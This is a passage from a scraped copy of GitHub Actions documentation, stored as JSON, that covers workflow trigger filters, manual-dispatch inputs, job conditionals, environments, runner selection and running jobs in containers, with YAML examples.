        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'\n    # Sequence of patterns matched against refs/tags\n    tags-ignore:\n      - v2\n      - v1.*"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Including and excluding branches and tags"
      },
      {
        "type": "paragraph",
        "text": "You can't usebranchesandbranches-ignoreto filter the same event in a single workflow. Similarly, you can't usetagsandtags-ignoreto filter the same event in a single workflow. If you want to both include and exclude branch or tag patterns for a single event, use thebranchesortagsfilter along with the!character to indicate which branches or tags should be excluded."
      },
      {
        "type": "paragraph",
        "text": "If you define a branch with the!character, you must also define at least one branch without the!character. If you only want to exclude branches, usebranches-ignoreinstead. Similarly, if you define a tag with the!character, you must also define at least one tag without the!character. If you only want to exclude tags, usetags-ignoreinstead."
      },
      {
        "type": "paragraph",
        "text": "The order that you define patterns matters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the Git ref.",
          "A matching positive pattern after a negative match will include the Git ref again."
        ]
      },
      {
        "type": "paragraph",
        "text": "The following workflow will run on pushes toreleases/10orreleases/beta/mona, but not onreleases/10-alphaorreleases/beta/3-alphabecause the negative pattern!releases/**-alphafollows the positive pattern."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using filters to target specific paths for pull request or push events"
      },
      {
        "type": "paragraph",
        "text": "When using thepushandpull_requestevents, you can configure a workflow to run based on what file paths are changed. Path filters are not evaluated for pushes of tags."
      },
      {
        "type": "paragraph",
        "text": "Use thepathsfilter when you want to include file path patterns or when you want to both include and exclude file path patterns. Use thepaths-ignorefilter when you only want to exclude file path patterns. You cannot use both thepathsandpaths-ignorefilters for the same event in a workflow. If you want to both include and exclude path patterns for a single event, use thepathsfilter prefixed with the!character to indicate which paths should be excluded."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The order that you definepathspatterns matters:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the path.",
          "A matching positive pattern after a negative match will include the path again."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you define bothbranches/branches-ignoreandpaths/paths-ignore, the workflow will only run when both filters are satisfied."
      },
      {
        "type": "paragraph",
        "text": "Thepathsandpaths-ignorekeywords accept glob patterns that use the*and**wildcard characters to match more than one path name. For more information, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Including paths"
      },
      {
        "type": "paragraph",
        "text": "If at least one path matches a pattern in thepathsfilter, the workflow runs. For example, the following workflow would run anytime you push a JavaScript file (.js)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "If a workflow is skipped due to path filtering,branch filtering, or acommit message, then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Excluding paths"
      },
      {
        "type": "paragraph",
        "text": "When all the path names match patterns inpaths-ignore, the workflow will not run. If any path names do not match patterns inpaths-ignore, even if some path names match the patterns, the workflow will run."
      },
      {
        "type": "paragraph",
        "text": "A workflow with the following path filter will only run onpushevents that include at least one file outside thedocsdirectory at the root of the repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths-ignore:\n      - 'docs/**'"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Including and excluding paths"
      },
      {
        "type": "paragraph",
        "text": "You cannot usepathsandpaths-ignoreto filter the same event in a single workflow. If you want to both include and exclude path patterns for a single event, use thepathsfilter prefixed with the!character to indicate which paths should be excluded."
      },
      {
        "type": "paragraph",
        "text": "If you define a path with the!character, you must also define at least one path without the!character. If you only want to exclude paths, usepaths-ignoreinstead."
      },
      {
        "type": "paragraph",
        "text": "The order that you definepathspatterns matters:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the path.",
          "A matching positive pattern after a negative match will include the path again."
        ]
      },
      {
        "type": "paragraph",
        "text": "This example runs anytime thepushevent includes a file in thesub-projectdirectory or its subdirectories, unless the file is in thesub-project/docsdirectory. For example, a push that changedsub-project/index.jsorsub-project/src/index.jswill trigger a workflow run, but a push changing onlysub-project/docs/readme.mdwill not."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths:\n      - 'sub-project/**'\n      - '!sub-project/docs/**'"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Git diff comparisons"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you push more than 1,000 commits, or if GitHub does not generate the diff due to a timeout, the workflow will always run."
      },
      {
        "type": "paragraph",
        "text": "The filter determines if a workflow should run by evaluating the changed files and running them against thepaths-ignoreorpathslist. If there are no files changed, the workflow will not run."
      },
      {
        "type": "paragraph",
        "text": "GitHub generates the list of changed files using two-dot diffs for pushes and three-dot diffs for pull requests:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Pull requests:Three-dot diffs are a comparison between the most recent version of the topic branch and the commit where the topic branch was last synced with the base branch.",
          "Pushes to existing branches:A two-dot diff compares the head and base SHAs directly with each other.",
          "Pushes to new branches:A two-dot diff against the parent of the ancestor of the deepest commit pushed."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Diffs are limited to 300 files. If there are files changed that aren't matched in the first 300 files returned by the filter, the workflow will not run. You may need to create more specific filters so that the workflow will run automatically."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout comparing branches in pull requests."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using filters to target specific branches for workflow run events"
      },
      {
        "type": "paragraph",
        "text": "When using theworkflow_runevent, you can specify what branches the triggering workflow must run on in order to trigger your workflow."
      },
      {
        "type": "paragraph",
        "text": "Thebranchesandbranches-ignorefilters accept glob patterns that use characters like*,**,+,?,!and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need toescapeeach of these special characters with\\. For more information about glob patterns, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the following trigger will only run when the workflow namedBuildruns on a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "A workflow with the following trigger will only run when the workflow namedBuildruns on a branch that is not namedcanary:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches-ignore:\n      - \"canary\""
      },
      {
        "type": "paragraph",
        "text": "You cannot use both thebranchesandbranches-ignorefilters for the same event in a workflow. If you want to both include and exclude branch patterns for a single event, use thebranchesfilter along with the!character to indicate which branches should be excluded."
      },
      {
        "type": "paragraph",
        "text": "The order that you define patterns matters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the branch.",
          "A matching positive pattern after a negative match will include the branch again."
        ]
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the following trigger will run when the workflow namedBuildruns on a branch that is namedreleases/10orreleases/beta/monabut will notreleases/10-alpha,releases/beta/3-alpha, ormain."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining inputs for manually triggered workflows"
      },
      {
        "type": "paragraph",
        "text": "When using theworkflow_dispatchevent, you can optionally specify inputs that are passed to the workflow."
      },
      {
        "type": "paragraph",
        "text": "This trigger only receives events when the workflow file is on the default branch.\nThe triggered workflow receives the inputs in theinputscontext. For more information, seeContexts."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The workflow will also receive the inputs in thegithub.event.inputscontext. The information in theinputscontext andgithub.event.inputscontext is identical except that theinputscontext preserves Boolean values as Booleans instead of converting them to strings. Thechoicetype resolves to a string and is a single selectable option.",
          "The maximum number of top-level properties forinputsis 10.",
          "The maximum payload forinputsis 65,535 characters."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n          - info\n          - warning\n          - debug\n      print_tags:\n        description: 'True to print to STDOUT'\n        required: true\n        type: boolean\n      tags:\n        description: 'Test scenario tags'\n        required: true\n        type: string\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n\njobs:\n  print-tag:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.print_tags }} \n    steps:\n      - name: Print the input tag to STDOUT\n        run: echo  The tags are ${{ inputs.tags }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining inputs, outputs, and secrets for reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "You can define inputs and secrets that a reusable workflow should receive from a calling workflow. You can also specify outputs that a reusable workflow will make available to a calling workflow. For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using event information"
      },
      {
        "type": "paragraph",
        "text": "Information about the event that triggered a workflow run is available in thegithub.eventcontext. The properties in thegithub.eventcontext depend on the type of event that triggered the workflow. For example, a workflow triggered when an issue is labeled would have information about the issue and label."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Viewing all properties of an event"
      },
      {
        "type": "paragraph",
        "text": "Reference the webhook event documentation for common properties and example payloads. For more information, seeWebhook events and payloads."
      },
      {
        "type": "paragraph",
        "text": "You can also print the entiregithub.eventcontext to see what properties are available for the event that triggered your workflow:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  print_context:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          EVENT_CONTEXT: ${{ toJSON(github.event) }}\n        run: |\n          echo $EVENT_CONTEXT"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Accessing and using event properties"
      },
      {
        "type": "paragraph",
        "text": "You can use thegithub.eventcontext in your workflow. For example, the following workflow runs when a pull request that changespackage*.json,.github/CODEOWNERS, or.github/workflows/**is opened. If the pull request author (github.event.pull_request.user.login) is notoctobotordependabot[bot], then the workflow uses the GitHub CLI to label and comment on the pull request (github.event.pull_request.number)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types:\n      - opened\n    paths:\n      - '.github/workflows/**'\n      - '.github/CODEOWNERS'\n      - 'package*.json'\n\njobs:\n  triage:\n    if: >-\n      github.event.pull_request.user.login != 'octobot' &&\n      github.event.pull_request.user.login != 'dependabot[bot]'\n    runs-on: ubuntu-latest\n    steps:\n      - name: \"Comment about changes we can't accept\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          PR: ${{ github.event.pull_request.html_url }}\n        run: |\n          gh pr edit $PR --add-label 'invalid'\n          gh pr comment $PR --body 'It looks like you edited `package*.json`, `.github/CODEOWNERS`, or `.github/workflows/**`. We do not allow contributions to these files. Please review our [contributing guidelines](https://github.com/octo-org/octo-repo/blob/main/CONTRIBUTING.md) for what contributions are accepted.'"
      },
      {
        "type": "paragraph",
        "text": "For more information about contexts, seeAccessing contextual information about workflow runs. For more information about event payloads, seeWebhook events and payloads."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further controlling how your workflow will run"
      },
      {
        "type": "paragraph",
        "text": "If you want more granular control than events, event activity types, or event filters provide, you can use conditionals and environments to control whether individual jobs or steps in your workflow will run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using conditionals"
      },
      {
        "type": "paragraph",
        "text": "You can use conditionals to further control whether jobs or steps in your workflow will run."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example using a value in the event payload"
      },
      {
        "type": "paragraph",
        "text": "For example, if you want the workflow to run when a specific label is added to an issue, you can trigger on theissues labeledevent activity type and use a conditional to check what label triggered the workflow. The following workflow will run when any label is added to an issue in the workflow's repository, but therun_if_label_matchesjob will only execute if the label is namedbug."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types:\n      - labeled\n\njobs:\n  run_if_label_matches:\n    if: github.event.label.name == 'bug'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo 'The label was bug'"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example using event type"
      },
      {
        "type": "paragraph",
        "text": "For example, if you want to run different jobs or steps depending on what event triggered the workflow, you can use a conditional to check whether a specific event type exists in the event context. The following workflow will run whenever an issue or pull request is closed. If the workflow ran because an issue was closed, thegithub.eventcontext will contain a value forissuebut not forpull_request. Therefore, theif_issuestep will run but theif_prstep will not run. Conversely, if the workflow ran because a pull request was closed, theif_prstep will run but theif_issuestep will not run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types:\n      - closed\n  pull_request:\n    types:\n      - closed\n\njobs:\n  state_event_type:\n    runs-on: ubuntu-latest\n    steps:\n    - name: if_issue\n      if: github.event.issue\n      run: |\n        echo An issue was closed\n    - name: if_pr\n      if: github.event.pull_request\n      run: |\n        echo A pull request was closed"
      },
      {
        "type": "paragraph",
        "text": "For more information about what information is available in the event context, seeUsing event information. For more information about how to use conditionals, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environments to manually trigger workflow jobs"
      },
      {
        "type": "paragraph",
        "text": "If you want to manually trigger a specific job in a workflow, you can use an environment that requires approval from a specific team or user. First, configure an environment with required reviewers. For more information, seeManaging environments for deployment. Then, reference the environment name in a job in your workflow using theenvironment:key. Any job referencing the environment will not run until at least one reviewer approves the job."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow will run whenever there is a push to main. Thebuildjob will always run. Thepublishjob will only run after thebuildjob successfully completes (due toneeds: [build]) and after all of the rules (including required reviewers) for the environment calledproductionpass (due toenvironment: production)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: build\n        run: |\n          echo 'building'\n\n  publish:\n    needs: [build]\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: publish\n        run: |\n          echo 'publishing'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Environments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Available events"
      },
      {
        "type": "paragraph",
        "text": "For a full list of available events, seeEvents that trigger workflows."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/using-conditions-to-control-job-execution",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "A job that is skipped will report its status as \"Success\". It will not prevent a pull request from merging, even if it is a required check."
      },
      {
        "type": "paragraph",
        "text": "You can use thejobs.<job_id>.ifconditional to prevent a job from running unless a condition is met. You can use any supported context and expression to create a conditional. For more information on which contexts are supported in this key, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Thejobs.<job_id>.ifcondition is evaluated beforejobs.<job_id>.strategy.matrixis applied."
      },
      {
        "type": "paragraph",
        "text": "When you use expressions in anifconditional, you can, optionally, omit the${{ }}expression syntax because GitHub Actions automatically evaluates theifconditional as an expression. However, this exception does not apply everywhere."
      },
      {
        "type": "paragraph",
        "text": "You must always use the${{ }}expression syntax or escape with'',\"\", or()when the expression starts with!, since!is reserved notation in YAML format. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if: ${{ ! startsWith(github.ref, 'refs/tags/') }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only run job for specific repository"
      },
      {
        "type": "paragraph",
        "text": "This example usesifto control when theproduction-deployjob can run. It will only run if the repository is namedocto-repo-prodand is within theocto-orgorganization. Otherwise, the job will be marked asskipped."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: example-workflow\non: [push]\njobs:\n  production-deploy:\n    if: github.repository == 'octo-org/octo-repo-prod'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats"
      },
      {
        "type": "paragraph",
        "text": "On a skipped job, you should see \"This check was skipped.\""
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "In some parts of the workflow you cannot use environment variables. Instead you can use contexts to access the value of an environment variable. For more information, seeStore information in variables."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.runs-onto define the type of machine to run the job on."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The destination machine can be either aGitHub-hosted runner,larger runner, or aself-hosted runner."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You can target runners based on the labels assigned to them, or their group membership, or a combination of these.",
          "You can provideruns-onas:A single stringA single variable containing a stringAn array of strings, variables containing strings, or a combination of bothAkey: valuepair using thegrouporlabelskeys",
          "A single string",
          "A single variable containing a string",
          "An array of strings, variables containing strings, or a combination of both",
          "Akey: valuepair using thegrouporlabelskeys",
          "If you specify an array of strings or variables, your workflow will execute on any runner that matches all of the specifiedruns-onvalues. For example, here the job will only run on a self-hosted runner that has the labelslinux,x64, andgpu:runs-on:[self-hosted,linux,x64,gpu]For more information, seeChoosing self-hosted runners.",
          "You can mix strings and variables in an array. For example:on:workflow_dispatch:inputs:chosen-os:required:truetype:choiceoptions:-Ubuntu-macOSjobs:test:runs-on:[self-hosted,\"${{ inputs.chosen-os }}\"]steps:-run:echoHelloworld!",
          "If you would like to run your workflow on multiple machines, usejobs.<job_id>.strategy."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Quotation marks are not required around simple strings likeself-hosted, but they are required for expressions like\"${{ inputs.chosen-os }}\"."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Choosing GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "If you use a GitHub-hosted runner, each job runs in a fresh instance of a runner image specified byruns-on."
      },
      {
        "type": "paragraph",
        "text": "The value for runs-on, when you are using a GitHub-hosted runner, is a runner label or the name of a runner group. The labels for the standard GitHub-hosted runners are shown in the following tables."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Standard GitHub-hosted runners for public repositories"
      },
      {
        "type": "paragraph",
        "text": "For public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The arm64 Linux and Windows runners are in public preview and subject to change."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Standard GitHub-hosted runners for  private repositories"
      },
      {
        "type": "paragraph",
        "text": "For  private repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, seeAbout billing for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "In addition to the standard GitHub-hosted runners, GitHub offers customers on GitHub Team and GitHub Enterprise Cloud plans a range of managed virtual machines with advanced features - for example, more cores and disk space, GPU-powered machines, and ARM-powered machines. For more information, seeAbout larger runners."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The-latestrunner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Beta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Specifying an operating system"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: ubuntu-latest"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Choosing self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "To specify a self-hosted runner for your job, configureruns-onin your workflow file with self-hosted runner labels."
      },
      {
        "type": "paragraph",
        "text": "Self-hosted runners may have theself-hostedlabel. When setting up a self-hosted runner, by default we will include the labelself-hosted. You may pass in the--no-default-labelsflag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins withself-hosted(this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify."
      },
      {
        "type": "paragraph",
        "text": "Note that Actions Runner Controller does not support multiple labels and does not support theself-hostedlabel."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Using labels for runner selection"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: [self-hosted, linux]"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout self-hosted runnersandUsing self-hosted runners in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Choosing runners in a group"
      },
      {
        "type": "paragraph",
        "text": "You can useruns-onto target runner groups, so that the job will execute on any runner that is a member of that group. For more granular control, you can also combine runner groups with labels."
      },
      {
        "type": "paragraph",
        "text": "Runner groups can only havelarger runnersorself-hosted runnersas members."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Using groups to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "In this example, Ubuntu runners have been added to a group calledubuntu-runners. Theruns-onkey sends the job to any available runner in theubuntu-runnersgroup:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Combining groups and labels"
      },
      {
        "type": "paragraph",
        "text": "When you combine groups and labels, the runner must meet both requirements to be eligible to run the job."
      },
      {
        "type": "paragraph",
        "text": "In this example, a runner group calledubuntu-runnersis populated with Ubuntu runners, which have also been assigned the labelubuntu-20.04-16core. Theruns-onkey combinesgroupandlabelsso that the job is routed to any available runner within the group that also has a matching label:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/running-jobs-in-a-container",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.containerto create a container to run any steps in a job that don't already specify a container. If you have steps that use both script and container actions, the container actions will run as sibling containers on the same network with the same volume mounts."
      },
      {
        "type": "paragraph",
        "text": "If you do not set acontainer, all steps will run directly on the host specified byruns-onunless a step refers to an action configured to run in a container."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The default shell forrunsteps inside a container isshinstead ofbash. This can be overridden withjobs.<job_id>.defaults.runorjobs.<job_id>.steps[*].shell."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Running a job within a container"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: CI\non:\n  push:\n    branches: [ main ]\njobs:\n  container-test-job:\n    runs-on: ubuntu-latest\n    container:\n      image: node:18\n      env:\n        NODE_ENV: development\n      ports:\n        - 80\n      volumes:\n        - my_docker_volume:/volume_mount\n      options: --cpus 1\n    steps:\n      - name: Check for dockerenv file\n        run: (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)"
      },
      {
        "type": "paragraph",
        "text": "When you only specify a container image, you can omit theimagekeyword."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  container-test-job:\n    runs-on: ubuntu-latest\n    container: node:18"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining the container image"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.imageto define the Docker image to use as the container to run the action. The value can be the Docker Hub image name or a registry name."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Docker Hub normally imposes rate limits on both push and pull operations which will affect jobs on self-hosted runners. However, GitHub-hosted runners are not subject to these limits based on an agreement between GitHub and Docker."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining credentials for a container registry"
      },
      {
        "type": "paragraph",
        "text": "If the image's container registry requires authentication to pull the image, you can usejobs.<job_id>.container.credentialsto set amapof theusernameandpassword. The credentials are the same values that you would provide to thedocker logincommand."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Defining credentials for a container registry"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "container:\n  image: ghcr.io/owner/image\n  credentials:\n     username: ${{ github.actor }}\n     password: ${{ secrets.github_token }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using environment variables with a container"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.envto set amapof environment variables in the container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Exposing network ports on a container"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.portsto set anarrayof ports to expose on the container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Mounting volumes in a container"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.volumesto set anarrayof volumes for the container to use. You can use volumes to share data between services or other steps in a job. You can specify named Docker volumes, anonymous Docker volumes, or bind mounts on the host."
      },
      {
        "type": "paragraph",
        "text": "To specify a volume, you specify the source and destination path:"
      },
      {
        "type": "paragraph",
        "text": "<source>:<destinationPath>."
      },
      {
        "type": "paragraph",
        "text": "The<source>is a volume name or an absolute path on the host machine, and<destinationPath>is an absolute path in the container."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Mounting volumes in a container"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "volumes:\n  - my_docker_volume:/volume_mount\n  - /data/my_data\n  - /source/directory:/destination/directory"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting container resource options"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.optionsto configure additional Docker container resource options. For a list of options, seedocker createoptions."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "The--networkand--entrypointoptions are not supported."
      }
    ]
  }
]